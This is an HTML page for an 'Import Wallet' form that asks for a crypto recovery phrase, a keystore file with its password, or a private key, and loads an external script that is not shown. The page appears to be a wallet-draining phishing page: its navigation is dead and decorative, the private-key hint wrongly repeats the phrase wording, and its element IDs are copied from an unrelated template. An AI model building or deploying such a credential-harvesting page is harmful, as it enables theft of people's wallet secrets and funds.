<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="theme-color" content="#00a7ff">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/fontawesome-free-6.0.0-beta2-web/fontawesome-free-6.0.0-beta2-web/css/solid.min.css">
    <link rel="stylesheet" href="/fontawesome-free-6.0.0-beta2-web/fontawesome-free-6.0.0-beta2-web/css/fontawesome.min.css">
    <link rel="stylesheet" href="/style/wallet.css">
    <title>Show Value</title>
    <style>
       
        .c {
            display: none;
        }
        .c.active {
            display: block;
            
        }
        body {
    width: 100%;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
}
header {
    width: 100%;
}
.header {

    color: rgb(88, 120, 188);
    text-decoration: none;
    font-weight: 550;
    font-size: 16px;
    width: 90%;
    margin: 2rem auto;
    display: flex;
    justify-content: space-between;
}
.logo img {
    width: 100px;
}
.col-1 {
    font-size: 1.4rem;
}
    </style>
</head>
<body>
    <header>
        <div class="header">
            <div class="col-1">GitHub</div>
            <div class="col-1">Docs</div>
            <div class="logo">
                <img src="/logo.svg" alt="logo">
            </div>
            <div class="col-1">Wallets</div>
            <div class="col-1">Apps</div>
        </div>
    </header>
    <div class="container">
        
        <div class="head">
           
        <h2 >
           Import Wallet
        </h2>
    </div>
    <div class="btns">
    <button data-id="mission" id="phrasse">Phrase</button>
    <button data-id="vision" id="json">Keystore JSON</button>
    <button data-id="goal" id="key">Private Key</button>
</div>

<div class="content">
    <div class="c cont-1 active" id="mission">
        <input type="text" placeholder="Phrase" id="txt1" required>
            <p>
                Typically 12(sometimes 24) words separated by a single spaces
            </p>
            <input type="button" value="Import" id="import">
    </div>
    <div class="c cont-2" id="vision">
        <input type="text" placeholder="Keystore JSON" id="txt2" required>
            <br>
            <input type="password" placeholder="Password" id="pwd" required>
            <p>
                Several lines of text beginning with "{...}" plus the password you used to encrypt it.
            </p>
            <input type="button" value="Import" id="import">
    </div>
    <div class="c cont-3" id="goal">
        <input type="text" placeholder="Private Key" id="key" required>
            <p>
                Typically 12 (sometimes 24) words separated by a single space.
            </p>
            <input type="button" value="Import" id="import">
    </div>
</div>
</div>
<script src="/scripts/wallet.js"></script>
</body>
</html>
